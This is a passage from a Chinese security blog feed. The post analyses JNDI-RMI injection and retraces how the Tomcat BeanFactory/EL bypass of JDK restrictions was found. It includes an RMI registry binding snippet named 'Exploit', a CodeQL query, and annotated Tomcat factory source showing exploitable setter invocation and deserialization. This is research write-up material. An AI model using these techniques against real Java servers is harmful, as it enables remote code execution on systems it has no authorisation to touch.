class="line"></span><br><span class="line">#2. reference</span><br><span class="line">Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;Exploit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Exploit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;http://localhost:8000/&quot;</span>);</span><br><span class="line">ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">registry.bind(<span class="string">&quot;Exploit&quot;</span>,referenceWrapper);</span><br></pre></td></tr></table></figure><p>但是ReferenceWrapper(ResourceRef) 可以吗？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ReferenceWrapper</span><span class="params">(Reference var1)</span> <span class="keyword">throws</span> NamingException, RemoteException </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.wrappee = var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ResourceRef 继承Reference，可以</p><h3 id="BeanFactory-的定位"><a href="#BeanFactory-的定位" class="headerlink" title="BeanFactory 的定位"></a>BeanFactory 的定位</h3><p>再回顾下javax.naming.spi.NamingManager#getObjectInstance 的过程</p><ol><li>ref = (Reference) refInfo;</li><li>String f = ref.getFactoryClassName();</li><li>factory = getObjectFactoryFromReference(ref, f);</li><li>return factory.getObjectInstance(ref, name, nameCtx,  environment);</li></ol><p>结合ResourceRef 的构造函数以及factory属性<br><code>public ResourceRef(String resourceClass, String description, String scope, String auth, boolean singleton, String factory, String factoryLocation) &#123;</code></p><p>那么问题就成了：寻找可利用的Factory，需要满足</p><ol><li>继承Factory</li><li>getObjectInstance 有可利用空间<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">class MyFactory extends ClassOrInterface&#123;</span><br><span class="line">MyFactory()&#123;</span><br><span class="line">this.getName()&#x3D;&quot;ObjectFactory&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">predicate isMyClass( Class m)&#123;</span><br><span class="line">m.getASourceSupertype() instanceof MyFactory</span><br><span class="line">&#125;</span><br><span class="line">from Class c</span><br><span class="line">where isMyClass(c)</span><br><span class="line">select c</span><br></pre></td></tr></table></figure>找找tomcat下面符合的Factory：</li></ol><ul><li>org.apache.naming.factory.BeanFactory</li><li>org.apache.tomcat.dbcp.dbcp2.datasources.InstanceKeyDataSourceFactory</li><li>org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory</li><li>org.apache.tomcat.jdbc.pool.DataSourceFactory</li></ul><h4 id="org-apache-naming-factory-BeanFactory"><a href="#org-apache-naming-factory-BeanFactory" class="headerlink" title="org.apache.naming.factory.BeanFactory"></a>org.apache.naming.factory.BeanFactory</h4><p>利用要求总结：</p><ol><li>需要有无参构造函数</li><li>可以调用符合条件的方法，要求方法的参数为1个，类型为String</li><li>还可以调用set*方法，要求方法的参数为1个，类型为String</li><li>以上方法都要求public</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,</span></span></span><br><span class="line"><span class="function"><span class="params">                                Hashtable&lt;?,?&gt; environment)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line"></span><br><span class="line">    Reference ref = (Reference) obj;</span><br><span class="line">    String beanClassName = ref.getClassName();</span><br><span class="line">    ClassLoader tcl = Thread.currentThread().getContextClassLoader();</span><br><span class="line">    <span class="comment">// 1. 反射获取类对象</span></span><br><span class="line">    <span class="keyword">if</span> (tcl != <span class="keyword">null</span>) &#123;</span><br><span class="line">        beanClass = tcl.loadClass(beanClassName);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        beanClass = Class.forName(beanClassName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. 初始化类实例</span></span><br><span class="line">    Object bean = beanClass.getConstructor().newInstance();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 根据 Reference 的属性查找 setter 方法的别名</span></span><br><span class="line">    RefAddr ra = ref.get(<span class="string">&quot;forceString&quot;</span>);</span><br><span class="line">    String value = (String)ra.getContent();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 循环解析别名并保存到字典中</span></span><br><span class="line">    <span class="keyword">for</span> (String param: value.split(<span class="string">&quot;,&quot;</span>)) &#123;</span><br><span class="line">        param = param.trim();</span><br><span class="line">        index = param.indexOf(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            setterName = param.substring(index + <span class="number">1</span>).trim();</span><br><span class="line">            param = param.substring(<span class="number">0</span>, index).trim();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            setterName = <span class="string">&quot;set&quot;</span> +</span><br><span class="line">                param.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(Locale.ENGLISH) +</span><br><span class="line">                param.substring(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        forced.put(param, beanClass.getMethod(setterName, paramTypes));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 解析所有属性，并根据别名去调用 setter 方法</span></span><br><span class="line">    Enumeration&lt;RefAddr&gt; e = ref.getAll();</span><br><span class="line">    <span class="keyword">while</span> (e.hasMoreElements()) &#123;</span><br><span class="line">        ra = e.nextElement();</span><br><span class="line">        String propName = ra.getType();</span><br><span class="line">        String value = (String)ra.getContent();</span><br><span class="line">        Object[] valueArray = <span class="keyword">new</span> Object[<span class="number">1</span>];</span><br><span class="line">        Method method = forced.get(propName);</span><br><span class="line">        <span class="keyword">if</span> (method != <span class="keyword">null</span>) &#123;</span><br><span class="line">            valueArray[<span class="number">0</span>] = value;</span><br><span class="line">            method.invoke(bean, valueArray);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="org-apache-tomcat-dbcp-dbcp2-datasources-InstanceKeyDataSourceFactory"><a href="#org-apache-tomcat-dbcp-dbcp2-datasources-InstanceKeyDataSourceFactory" class="headerlink" title="org.apache.tomcat.dbcp.dbcp2.datasources.InstanceKeyDataSourceFactory"></a>org.apache.tomcat.dbcp.dbcp2.datasources.InstanceKeyDataSourceFactory</h4><p>利用要求总结：</p><ol><li>如果有本地Gadgets，可以反序列化，鸡肋</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(<span class="keyword">final</span> Object refObj, <span class="keyword">final</span> Name name, <span class="keyword">final</span> Context context,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">final</span> Hashtable&lt;?, ?&gt; env)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// The spec says to return null if we can&#x27;t create an instance</span></span><br><span class="line">    <span class="comment">// of the reference</span></span><br><span class="line">    Object obj = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (refObj <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">        <span class="keyword">final</span> Reference ref = (Reference) refObj;</span><br><span class="line">        <span class="keyword">if</span> (isCorrectClass(ref.getClassName())) &#123;</span><br><span class="line">            <span class="keyword">final</span> RefAddr refAddr = ref.get(<span class="string">&quot;instanceKey&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (refAddr != <span class="keyword">null</span> &amp;&amp; refAddr.getContent() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// object was bound to JNDI via Referenceable API.</span></span><br><span class="line">                obj = instanceMap.get(refAddr.getContent());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// Tomcat JNDI creates a Reference out of server.xml</span></span><br><span class="line">                <span class="comment">// &lt;ResourceParam&gt; configuration and passes it to an</span></span><br><span class="line">                <span class="comment">// instance of the factory given in server.xml.</span></span><br><span class="line">                String key = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">if</span> (name != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    key = name.toString();</span><br><span class="line">                    obj = instanceMap.get(key);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (obj == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">final</span> InstanceKeyDataSource ds = getNewInstance(ref);</span><br><span class="line">                    setCommonProperties(ref, ds);</span><br><span class="line">                    obj = ds;</span><br><span class="line">                    <span class="keyword">if</span> (key != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        instanceMap.put(key, ds);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setCommonProperties</span><span class="params">(<span class="keyword">final</span> Reference ref, <span class="keyword">final</span> InstanceKeyDataSource ikds)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    RefAddr refAddr = ref.get(<span class="string">&quot;dataSourceName&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (refAddr != <span class="keyword">null</span> &amp;&amp; refAddr.getContent() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ikds.setDataSourceName(refAddr.getContent().toString());</span><br><span class="line">    &#125;</span><br><span class="line">    refAddr = ref.get(<span class="string">&quot;description&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (refAddr != <span class="keyword">null</span> &amp;&amp; refAddr.getContent() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ikds.setDescription(refAddr.getContent().toString());</span><br><span class="line">    &#125;</span><br><span class="line">    refAddr = ref.get(<span class="string">&quot;jndiEnvironment&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (refAddr != <span class="keyword">null</span> &amp;&amp; refAddr.getContent() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">byte</span>[] serialized = (<span class="keyword">byte</span>[]) refAddr.getContent();</span><br><span class="line">        ikds.setJndiEnvironment((Properties) deserialize(serialized));</span><br><span class="line">    &#125;</span><br><span class="line">   ...</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> Object <span class="title">deserialize</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] data)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    ObjectInputStream in = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(data));</span><br><span class="line">        <span class="keyword">return</span> in.readObject();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (in != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                in.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> IOException ex) &#123;</span><br><span class="line">                <span class="comment">// ignore</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="org-apache-tomcat-jdbc-naming-GenericNamingResourcesFactory"><a href="#org-apache-tomcat-jdbc-naming-GenericNamingResourcesFactory" class="headerlink" title="org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory"></a>org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory</h4><p>利用要求总结：</p><ol><li>需要有无参构造函数</li><li>可以调用set*方法，要求方法的参数为1个，类型为String/Int/Long/Boolean/InetAddress</li><li>以上方法都要求public<br>不如BeanFactory，鸡肋</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ((obj == <span class="keyword">null</span>) || !(obj <span class="keyword">instanceof</span> Reference)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Reference ref = (Reference) obj;</span><br><span class="line">    Enumeration&lt;RefAddr&gt; refs = ref.getAll();</span><br><span class="line">    String type = ref.getClassName();</span><br><span class="line">    Object o =</span><br><span class="line">        ClassLoaderUtil.loadClass(</span><br><span class="line">            type,</span><br><span class="line">            GenericNamingResourcesFactory.class.getClassLoader(),</span><br><span class="line">            Thread.currentThread().getContextClassLoader()).getConstructor().newInstance();</span><br><span class="line">    <span class="keyword">while</span> (refs.hasMoreElements()) &#123;</span><br><span class="line">        RefAddr addr = refs.nextElement();</span><br><span class="line">        String param = addr.getType();</span><br><span class="line">        String value = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (addr.getContent()!=<span class="keyword">null</span>) &#123;</span><br><span class="line">            value = addr.getContent().toString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (setProperty(o, param, value)) &#123;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log.debug(<span class="string">&quot;Property not configured[&quot;</span>+param+<span class="string">&quot;]. No setter found on[&quot;</span>+o+<span class="string">&quot;].&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="org-apache-tomcat-jdbc-pool-DataSourceFactory"><a href="#org-apache-tomcat-jdbc-pool-DataSourceFactory" class="headerlink" title="org.apache.tomcat.jdbc.pool.DataSourceFactory"></a>org.apache.tomcat.jdbc.pool.DataSourceFactory</h4><p>利用要求总结：</p><ol><li>如果在rmi有限制url的情况，可以转jndi-ldap进行攻击</li></ol><p>不如BeanFactory，鸡肋</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,</span></span></span><br><span class="line"><span class="function"><span class="params">                                Hashtable&lt;?,?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// We only know how to deal with &lt;code&gt;javax.naming.Reference&lt;/code&gt;s</span></span><br><span class="line">    <span class="comment">// that specify a class name of &quot;javax.sql.DataSource&quot;</span></span><br><span class="line">    <span class="keyword">if</span> ((obj == <span class="keyword">null</span>) || !(obj <span class="keyword">instanceof</span> Reference)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Reference ref = (Reference) obj;</span><br><span class="line">    <span class="keyword">boolean</span> XA = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">boolean</span> ok = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;javax.sql.DataSource&quot;</span>.equals(ref.getClassName())) &#123;</span><br><span class="line">        ok = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;javax.sql.XADataSource&quot;</span>.equals(ref.getClassName())) &#123;</span><br><span class="line">        ok = <span class="keyword">true</span>;</span><br><span class="line">        XA = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (org.apache.tomcat.jdbc.pool.DataSource.class.getName().equals(ref.getClassName())) &#123;</span><br><span class="line">        ok = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ok) &#123;</span><br><span class="line">        log.warn(ref.getClassName()+<span class="string">&quot; is not a valid class name/type for this JNDI factory.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ALL_PROPERTIES.length; i++) &#123;</span><br><span class="line">        String propertyName = ALL_PROPERTIES[i];</span><br><span class="line">        RefAddr ra = ref.get(propertyName);</span><br><span class="line">        <span class="keyword">if</span> (ra != <span class="keyword">null</span>) &#123;</span><br><span class="line">            String propertyValue = ra.getContent().toString();</span><br><span class="line">            properties.setProperty(propertyName, propertyValue);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> createDataSource(properties,nameCtx,XA);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> DataSource <span class="title">createDataSource</span><span class="params">(Properties properties)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> createDataSource(properties,<span class="keyword">null</span>,<span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> DataSource <span class="title">createDataSource</span><span class="params">(Properties properties,Context context, <span class="keyword">boolean</span> XA)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    PoolConfiguration poolProperties = DataSourceFactory.parsePoolProperties(properties);</span><br><span class="line">    <span class="keyword">if</span> (poolProperties.getDataSourceJNDI()!=<span class="keyword">null</span> &amp;&amp; poolProperties.getDataSource()==<span class="keyword">null</span>) &#123;</span><br><span class="line">        performJNDILookup(context, poolProperties);</span><br><span class="line">    &#125;</span><br><span class="line">    org.apache.tomcat.jdbc.pool.DataSource dataSource = XA?</span><br><span class="line">            <span class="keyword">new</span> org.apache.tomcat.jdbc.pool.XADataSource(poolProperties) :</span><br><span class="line">            <span class="keyword">new</span> org.apache.tomcat.jdbc.pool.DataSource(poolProperties);</span><br><span class="line">    <span class="comment">//initialise the pool itself</span></span><br><span class="line">    dataSource.createPool();</span><br><span class="line">    <span class="comment">// Return the configured DataSource instance</span></span><br><span class="line">    <span class="keyword">return</span> dataSource;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="javax-el-ELProcessor-的定位"><a href="#javax-el-ELProcessor-的定位" class="headerlink" title="javax.el.ELProcessor 的定位"></a>javax.el.ELProcessor 的定位</h3><p>这个只能归结为经验吧，原生jdk里能够命令执行的sink毕竟不多。</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>如果是bind触发，有没有什么不一样?</li><li>Weblogic/jboss/Websphere 等其他web容器上呢，是否也有类似的Factory？</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文首先介绍了一些已知的知识点：</p><ol><li>JNDI-RMI 低版本注入的逻辑</li><li>JNDI-RMI 高版本注入的限制：decodeObject 限制了Reference 类，以及Tomcat EL 绕过的方式</li></ol><p>在此基础上，本文尝试回溯EL 绕过方式的发现思路</p><ol><li>首先寻找能够突破decodeObject 限制的Reference 子类</li><li>寻找能够利用的Factory</li></ol><p>最终成功回溯出了EL 绕过方式，以及一些其他的鸡肋姿势，颇有收获。</p><p>@20220318</p><p>膜一个浅蓝师傅，在BeanFactory 的利用上找到了除EL 之外的多个sink，还有MemoryUserDatabaseFactory、BasicDataSourceFactory 等几个其他的Factory，功力深厚，膜一个。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1]<a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">如何绕过高版本JDK的限制进行JNDI注入利用 (by: KINGX)</a></li><li>[2]<a href="https://tttang.com/archive/1405/#comment-12212">探索高版本 JDK 下 JNDI 漏洞的利用方法(by: 浅蓝)</a></li></ul><!-- ## 其他#### 关于RegistryContext#bind 的攻击以上是RegistryContext#lookup 攻击com.sun.jndi.rmi.registry.RegistryContext 能bind 哪些类？<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bind</span><span class="params">(Name var1, Object var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidNameException(<span class="string">&quot;RegistryContext: Cannot bind empty name&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.registry.bind(var1.get(<span class="number">0</span>), <span class="keyword">this</span>.encodeObject(var2, var1.getPrefix(<span class="number">1</span>)));</span><br><span class="line">...</span><br><span class="line">    <span class="function"><span class="keyword">private</span> Remote <span class="title">encodeObject</span><span class="params">(Object var1, Name var2)</span> <span class="keyword">throws</span> NamingException, RemoteException </span>&#123;</span><br><span class="line">        var1 = NamingManager.getStateToBind(var1, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">        <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> Remote) &#123;</span><br><span class="line">            <span class="keyword">return</span> (Remote)var1;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> ReferenceWrapper((Reference)var1);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> ReferenceWrapper(((Referenceable)var1).getReference());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;RegistryContext: object to bind must be Remote, Reference, or Referenceable&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>所以，能够bind的有</p><ul><li>Remote</li><li>Reference</li><li>Referenceable</li></ul><p>–&gt;</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/pasted-203.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;
&lt;p&gt;上面的JNDI 注入的JDK 版本限制已经耳熟能详了，针对JNDI-RMI 的tomcat EL 绕过姿势也被经常提起，本文尝试回溯这一姿势的发现过程。&lt;/p&gt;
&lt;h2 id=&quot;JNDI-RMI-注入&quot;&gt;&lt;a href=&quot;#JNDI-RMI-注入&quot; class=&quot;headerlink&quot; title=&quot;JNDI-RMI 注入&quot;&gt;&lt;/a&gt;JNDI-RMI 注入&lt;/h2&gt;&lt;h3 id=&quot;背景知识&quot;&gt;&lt;a href=&quot;#背景知识&quot; class=&quot;headerlink&quot; title=&quot;背景知识&quot;&gt;&lt;/a&gt;背景知识&lt;/h3&gt;&lt;p&gt;必须了解两个重要的类&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;com.sun.jndi.rmi.registry.RegistryContext： JNDI-RMI接口&lt;/li&gt;
&lt;li&gt;java.rmi.registry.Registry： RMI 接口&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通常攻击场景下，Registry是作为RMI服务端，RegistryContext是作为攻击的client端，也就是vuln。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="JNDI" scheme="http://m0d9.me/tags/JNDI/"/>
    
    <category term="RMI" scheme="http://m0d9.me/tags/RMI/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL with CVE-2021-2471</title>
    <link href="http://m0d9.me/2021/11/01/CodeQL-CVE-2021-2471/"/>
    <id>http://m0d9.me/2021/11/01/CodeQL-CVE-2021-2471/</id>
    <published>2021-11-01T13:19:00.000Z</published>
    <updated>2021-11-12T08:34:13.369Z</updated>
    
